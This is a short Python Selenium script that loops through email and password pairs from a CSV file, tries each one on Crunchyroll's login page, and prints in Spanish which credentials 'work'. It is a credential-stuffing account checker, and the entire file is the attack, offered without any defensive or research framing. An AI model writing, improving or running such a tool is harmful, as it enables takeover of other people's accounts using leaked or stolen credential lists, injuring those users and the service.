import os.path
import csv
import requests
from selenium import webdriver
import time
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

with open('csv/data_crunchyroll.csv', 'r') as csv_file:
    csv_reader = csv.reader(csv_file)

    for line in csv_reader:
        try:
            driver = webdriver.Chrome()
            driver.maximize_window()

            driver.get('https://www.crunchyroll.com/offer-premium/login?utm_source=google&utm_medium=paid_cr&utm_campaign=CR-Paid_Google_Web_Conversion_LATAM_MX-CL_Trademark_SVOD&utm_term=pagina%20de%20anime%20crunchyroll&referrer=google_paid_cr_CR-Paid_Google_Web_Conversion_LATAM_MX-CL_Trademark_SVOD&gclid=EAIaIQobChMIpZqujuvaggMV5MzCBB18ugGJEAAYASAAEgLPBfD_BwE')

            time.sleep(5)
            username_field = driver.find_element(By.NAME, 'email')
            username_field.send_keys(line[0])

            password_field = driver.find_element(By.NAME, 'password')
            password_field.send_keys(line[1])


            submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div/div/form/div[2]')
            submit.click()
            time.sleep(2)
            print(f"Las credenciales {line} , funcionan correctamente")
        except NoSuchElementException:
            print(f"Las credenciales {line} no funcionan... Intentando con el siguiente conjunto.")
        finally:
            # Cerrar el navegador en cualquier caso
            driver.quit()